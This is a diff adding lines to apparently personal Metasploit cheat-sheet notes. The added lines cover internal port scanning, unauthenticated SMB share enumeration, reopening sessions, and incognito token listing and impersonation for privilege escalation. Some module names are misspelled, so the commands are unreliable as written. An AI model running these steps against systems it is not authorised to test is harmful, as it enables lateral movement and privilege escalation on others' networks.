@@ -89,3 +89,18 @@ background // setting session to background
 use auxxiliary/scanner/portscan/tcp // scanning hosts in other networks
 set RHOSTS subnetIP/mask // setting subnet/mask
 set PORTS portNUMBER
+set THREADS xx
+
+use autxiliary/scanner/smb/smb_enumshares // finding smb shares without credentials
+set rhosts
+
+sessions -i NUMBER // get back into a session
+shell // getting into a shell cmd
+whoami // find out who we are
+CTR-Z // getting back into previous shell
+use incognito // executes incognito module
+list_tokens -u // getting available tokens
+impersonate_token TOKEN
+shell
+whoami // find out who we are after impersonating token
+
